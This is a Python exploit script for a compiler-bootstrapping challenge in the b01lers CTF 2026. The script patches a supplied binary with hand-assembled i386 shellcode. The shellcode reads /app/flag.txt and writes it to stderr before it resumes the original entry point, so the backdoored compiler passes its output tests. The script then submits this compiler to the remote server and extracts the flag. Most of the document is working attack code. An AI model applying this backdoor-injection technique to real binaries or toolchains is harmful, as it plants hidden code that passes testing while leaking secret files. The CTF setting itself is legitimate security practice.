#!/usr/bin/env python3
"""
reflections — b01lers CTF 2026

A "Reflections on Trusting Trust" style compiler-bootstrapping challenge.

The server lets us submit a .he source, compiles it with the current compiler
(/tmp/compiler, initially -> /app/calc1), runs tests against the produced
binary, and if the tests pass, swaps /tmp/compiler to point at our binary.

Key leak channel: during the STAGE-2 compile step, the server runs
    subprocess.run([COMPILER], stdin=f_in, stdout=f_out, timeout=5, check=True)
stderr is NOT captured -> it is inherited by the server process -> forwarded to
our TCP connection by pwn.red/jail.

Exploit:
  1. Build a backdoored 32-bit i386 ELF that is byte-identical to calc1 for all
     stdout behavior (so it passes every test), but at entry first opens
     /app/flag.txt, reads it, writes it to fd 2 (stderr), then falls through to
     the original calc1 _start.
  2. Convert that ELF to the .he raw-hex source form.
  3. Submit as stage 1 -> tests pass on stdout equality; stderr is captured and
     discarded during tests.
  4. Submit anything as stage 2 -> server invokes our backdoored binary as the
     compiler, its stderr leaks the flag to our socket.
"""
import socket
import ssl
import struct
import sys

HOST = "reflections.opus4-7.b01le.rs"
PORT = 8443

ORIG_BASE  = 0x08048000
ORIG_START = 0x080481ab
TRAILER_OFF = 659  # end of original calc1
TRAILER_VA  = ORIG_BASE + TRAILER_OFF
PATH        = b"/app/flag.txt\0"

def build_backdoor(calc1_bytes: bytes) -> bytes:
    assert len(calc1_bytes) == 659
    CODE_SIZE = 57
    path_va = TRAILER_VA + CODE_SIZE
    buf_va  = path_va + len(PATH)

    code  = bytes([0x31, 0xc9])                               # xor ecx, ecx
    code += bytes([0xbb]) + struct.pack("<I", path_va)        # mov ebx, path
    code += bytes([0xb8, 0x05, 0x00, 0x00, 0x00])             # mov eax, 5  (sys_open)
    code += bytes([0xcd, 0x80])                               # int 0x80
    code += bytes([0x89, 0xc3])                               # mov ebx, eax (fd)
    code += bytes([0xb9]) + struct.pack("<I", buf_va)         # mov ecx, buf
    code += bytes([0xba, 0x00, 0x01, 0x00, 0x00])             # mov edx, 256
    code += bytes([0xb8, 0x03, 0x00, 0x00, 0x00])             # mov eax, 3  (sys_read)
    code += bytes([0xcd, 0x80])
    code += bytes([0x89, 0xc2])                               # mov edx, eax (n)
    code += bytes([0xb9]) + struct.pack("<I", buf_va)         # mov ecx, buf
    code += bytes([0xbb, 0x02, 0x00, 0x00, 0x00])             # mov ebx, 2  (stderr)
    code += bytes([0xb8, 0x04, 0x00, 0x00, 0x00])             # mov eax, 4  (sys_write)
    code += bytes([0xcd, 0x80])
    jmp_from = TRAILER_VA + CODE_SIZE
    code += bytes([0xe9]) + struct.pack("<i", ORIG_START - jmp_from)
    assert len(code) == CODE_SIZE

    trailer = code + PATH + b"\x00" * 256
    elf = bytearray(calc1_bytes) + trailer
    elf[0x18:0x1c] = struct.pack("<I", TRAILER_VA)        # e_entry
    elf[0x44:0x48] = struct.pack("<I", len(elf))          # p_filesz
    elf[0x48:0x4c] = struct.pack("<I", len(elf))          # p_memsz
    return bytes(elf)

def elf_to_he(elf: bytes) -> bytes:
    return (" ".join(f"{b:02x}" for b in elf) + "\n").encode()

def main():
    with open("calc1", "rb") as f:
        calc1 = f.read()
    elf = build_backdoor(calc1)
    stage1 = elf_to_he(elf)

    payload = stage1 + b"&&\n" + b"$41 @\n" + b"&&\n"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((HOST, PORT), timeout=30) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as ss:
            ss.sendall(payload)
            data = b""
            ss.settimeout(10)
            try:
                while True:
                    chunk = ss.recv(4096)
                    if not chunk: break
                    data += chunk
            except Exception:
                pass
    sys.stdout.buffer.write(data)
    # Extract flag
    import re
    m = re.search(rb"bctf\{[^}]+\}", data)
    if m:
        print("\n\nFLAG:", m.group().decode())

if __name__ == "__main__":
    main()
